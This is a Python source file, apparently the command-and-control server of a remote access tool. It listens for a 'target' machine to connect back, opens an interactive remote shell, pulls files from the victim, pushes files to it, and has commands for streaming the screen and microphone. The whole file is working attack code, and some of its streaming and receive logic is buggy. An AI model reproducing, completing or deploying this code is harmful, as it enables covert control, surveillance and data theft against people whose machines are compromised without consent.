import socket
import json
import os
import threading
import cv2
import pyautogui
import mss
import numpy as np
import struct
import pyaudio
import time

target_ip = '127.0.0.1'  # Replace with server IP address
target_port = 5005
video_port = 9999
audio_port = 6666

# Constants
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# Function to send data reliably as JSON-encoded strings
def reliable_send(socket, data):
    jsondata = json.dumps(data)
    socket.send(jsondata.encode())

# Function to receive data reliably as JSON-decoded strings
def reliable_recv(socket):
    data = ''
    while True:
        try:
            data = data + socket.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to upload a file to the target machine
def upload_file(socket, file_name):
    try:
        f = open(file_name, 'rb')
        socket.send(f.read())
    except FileNotFoundError as e:
        print(e)

# Function to download a file from the target machine
def download_file(socket, file_name):
    # Set a timeout for receiving data from the socket (1 second).
    socket.settimeout(1)
    
    try:
        first_chunk = socket.recv(1024)
        # Check for error message
        if first_chunk.startswith(b"ERROR:"):
            print(first_chunk.decode())
            return
        
        # Open the specified file in binary write ('wb') mode only if the first chunk is valid
        with open(file_name, 'wb') as f:
            f.write(first_chunk)
            
            while True:
                try:
                    chunk = socket.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                except TimeoutError:
                    break
    except Exception as e:
        print(f"Error occurred while downloading {file_name}: {str(e)}")
    finally:
        # Reset the timeout to its default value (None).
        socket.settimeout(None)




# Function for the main communication loop with the target
def target_communication(target):
    dir = ''
    while True:
        command = input(f'* Shell~{str(target_ip)}: {dir}$ ')
        reliable_send(target, command)

        # Common command
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            recv_data = reliable_recv(target)
            err = recv_data['stderr']
            if err:
                print(err)
            else:
                dir = recv_data['stdout'] + ' '
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:6] == 'upload':
            upload_file(target, command[7:])

        # Screen Streaming
        elif command == 'endscreen':
            screen_socket.close()
        elif command == 'endaudio':
            audio_socket.close()
        elif command == 'endscreenstream':
            screen_socket.close()
            audio_socket.close()
        # Command handling part
        elif command == 'screen':
            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            screen_socket.bind((target_ip, video_port))
            screen_socket.listen(1)  # Listen for one connection
            print("Screen server listening at:", (target_ip, video_port))

            client_socket, addr = screen_socket.accept()  # Accept the incoming connection
            print("Connection from:", addr)

            screen_thread = threading.Thread(target=screen_stream, args=(client_socket,))
            screen_thread.start()
            screen_thread.join()  # Wait for screen streaming to finish

        elif command == 'audio':
            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            audio_socket.bind((target_ip, audio_port))
            audio_socket.listen(5)
            print("Audio server listening at:", (target_ip, audio_port))

            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
            audio_thread.start()
            audio_thread.join()  # Wait for audio streaming to finish
        elif command == 'screen+audio':
            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            screen_socket.bind((target_ip, video_port))
            screen_socket.listen(5)
            print("Screen server listening at:", (target_ip, video_port))
            
            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            audio_socket.bind((target_ip, audio_port))
            audio_socket.listen(5)
            print("Audio server listening at:", (target_ip, audio_port))
            
            screen_thread = threading.Thread(target=screen_stream, args=(screen_socket,))
            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
            screen_thread.start()
            audio_thread.start()
            screen_thread.join()  # Wait for screen streaming to finish
            audio_thread.join()   # Wait for audio streaming to finish
        
        # Others
        else:
            result = reliable_recv(socket)
            print(result)

# Function to stream screen content
def screen_stream(client_socket):
    w, h = pyautogui.size()
    monitor = {"top": 0, "left": 0, "width": w, "height": h}
    
    try:
        t0 = time.time()
        n_frames = 1
        with mss.mss() as sct:
            while True:
                screen = sct.grab(monitor)
                frame = np.array(screen)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                message = struct.pack(">L", len(buffer)) + buffer.tobytes()
                try:
                    client_socket.sendall(message)
                except BrokenPipeError:
                    print("Broken pipe error, connection lost.")
                    break

                elapsed_time = time.time() - t0
                avg_fps = (n_frames / elapsed_time)
                print("Screen Average FPS: " + str(avg_fps))
                n_frames += 1
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        client_socket.close()

# Function to stream audio content
def audio_stream(client_socket):
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    
    try:
        while True:
            data = stream.read(CHUNK, exception_on_overflow=False)
            client_socket.sendall(data)
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()
        client_socket.close()

def main():
    # Create a socket for the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((target_ip, target_port))
    sock.listen(5)
    print('[+] Listening For The Incoming Connections')

    # Accept incoming connection from the target
    target, ip = sock.accept()
    print('[+] Target Connected From: ' + str(ip))

    # Start the main communication loop with the target
    target_comm_thread = threading.Thread(target=target_communication, args=(target,))
    target_comm_thread.start()
    target_comm_thread.join()

    # Close the server socket
    sock.close()

if __name__ == "__main__":
    main()
